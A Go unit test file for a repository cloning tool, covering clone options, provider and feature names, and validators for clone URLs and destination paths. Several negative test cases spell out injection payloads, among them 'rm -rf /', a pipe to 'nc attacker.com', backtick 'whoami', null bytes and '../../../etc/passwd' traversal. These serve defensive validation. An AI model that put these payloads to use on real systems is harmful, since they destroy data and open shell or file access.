package source

import (
	"testing"
)

func TestDefaultCloneOptions(t *testing.T) {
	opts := DefaultCloneOptions()

	// Default options use full clone for accurate git-sizer metrics
	if opts.Shallow {
		t.Error("Expected Shallow to be false (full clone needed for git-sizer)")
	}
	if opts.Bare {
		t.Error("Expected Bare to be false")
	}
	if opts.IncludeLFS {
		t.Error("Expected IncludeLFS to be false")
	}
	if opts.IncludeSubmodules {
		t.Error("Expected IncludeSubmodules to be false")
	}
}

func TestShallowCloneOptions(t *testing.T) {
	opts := ShallowCloneOptions()

	// Shallow options for fast clones when full history isn't needed
	if !opts.Shallow {
		t.Error("Expected Shallow to be true for shallow clone options")
	}
	if opts.Bare {
		t.Error("Expected Bare to be false")
	}
	if opts.IncludeLFS {
		t.Error("Expected IncludeLFS to be false")
	}
	if opts.IncludeSubmodules {
		t.Error("Expected IncludeSubmodules to be false")
	}
}

func TestProviderType_String(t *testing.T) {
	tests := []struct {
		providerType ProviderType
		expected     string
	}{
		{ProviderGitHub, "github"},
		{ProviderGitLab, "gitlab"},
		{ProviderAzureDevOps, "azuredevops"},
	}

	for _, tt := range tests {
		t.Run(string(tt.providerType), func(t *testing.T) {
			if string(tt.providerType) != tt.expected {
				t.Errorf("Expected %s, got %s", tt.expected, tt.providerType)
			}
		})
	}
}

func TestFeature_String(t *testing.T) {
	tests := []struct {
		feature  Feature
		expected string
	}{
		{FeatureLFS, "lfs"},
		{FeatureSubmodules, "submodules"},
		{FeatureWiki, "wiki"},
		{FeaturePages, "pages"},
		{FeatureActions, "actions"},
		{FeatureDiscussions, "discussions"},
	}

	for _, tt := range tests {
		t.Run(string(tt.feature), func(t *testing.T) {
			if string(tt.feature) != tt.expected {
				t.Errorf("Expected %s, got %s", tt.expected, tt.feature)
			}
		})
	}
}

func TestValidateCloneURL(t *testing.T) {
	tests := []struct {
		name      string
		cloneURL  string
		wantError bool
	}{
		{
			name:      "Valid HTTPS GitHub URL",
			cloneURL:  "https://github.com/user/repo.git",
			wantError: false,
		},
		{
			name:      "Valid HTTPS Azure DevOps URL",
			cloneURL:  "https://dev.azure.com/org/project/_git/repo",
			wantError: false,
		},
		{
			name:      "Valid SSH URL",
			cloneURL:  "ssh://git@github.com/user/repo.git",
			wantError: false,
		},
		{
			name:      "Valid git protocol URL",
			cloneURL:  "git://github.com/user/repo.git",
			wantError: false,
		},
		{
			name:      "Empty URL",
			cloneURL:  "",
			wantError: true,
		},
		{
			name:      "Invalid scheme - ftp",
			cloneURL:  "ftp://example.com/repo.git",
			wantError: true,
		},
		{
			name:      "URL with newline (injection attempt)",
			cloneURL:  "https://github.com/user/repo.git\nrm -rf /",
			wantError: true,
		},
		{
			name:      "URL with semicolon (injection attempt)",
			cloneURL:  "https://github.com/user/repo.git;rm -rf /",
			wantError: true,
		},
		{
			name:      "URL with backtick (injection attempt)",
			cloneURL:  "https://github.com/user/`whoami`.git",
			wantError: true,
		},
		{
			name:      "URL with pipe (injection attempt)",
			cloneURL:  "https://github.com/user/repo.git|nc attacker.com",
			wantError: true,
		},
		{
			name:      "URL without host",
			cloneURL:  "https:///repo.git",
			wantError: true,
		},
		{
			name:      "Malformed URL",
			cloneURL:  "not a valid url",
			wantError: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateCloneURL(tt.cloneURL)
			if tt.wantError && err == nil {
				t.Error("Expected error but got none")
			}
			if !tt.wantError && err != nil {
				t.Errorf("Expected no error but got: %v", err)
			}
		})
	}
}

func TestValidateDestPath(t *testing.T) {
	tests := []struct {
		name      string
		destPath  string
		wantError bool
	}{
		{
			name:      "Valid relative path",
			destPath:  "repos/myrepo",
			wantError: false,
		},
		{
			name:      "Valid absolute path",
			destPath:  "/tmp/repos/myrepo",
			wantError: false,
		},
		{
			name:      "Valid path with dots in name",
			destPath:  "repos/my.repo",
			wantError: false,
		},
		{
			name:      "Empty path",
			destPath:  "",
			wantError: true,
		},
		{
			name:      "Path with newline (injection attempt)",
			destPath:  "repos/myrepo\nrm -rf /",
			wantError: true,
		},
		{
			name:      "Path with semicolon (injection attempt)",
			destPath:  "repos/myrepo;rm -rf /",
			wantError: true,
		},
		{
			name:      "Path with backtick (injection attempt)",
			destPath:  "repos/`whoami`",
			wantError: true,
		},
		{
			name:      "Path with pipe (injection attempt)",
			destPath:  "repos/myrepo|nc attacker.com",
			wantError: true,
		},
		{
			name:      "Path with null byte",
			destPath:  "repos/myrepo\x00",
			wantError: true,
		},
		{
			name:      "Path starting with .. (traversal attempt)",
			destPath:  "../../../etc/passwd",
			wantError: true,
		},
		{
			name:      "Path with $ (variable expansion attempt)",
			destPath:  "repos/$HOME",
			wantError: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateDestPath(tt.destPath)
			if tt.wantError && err == nil {
				t.Error("Expected error but got none")
			}
			if !tt.wantError && err != nil {
				t.Errorf("Expected no error but got: %v", err)
			}
		})
	}
}
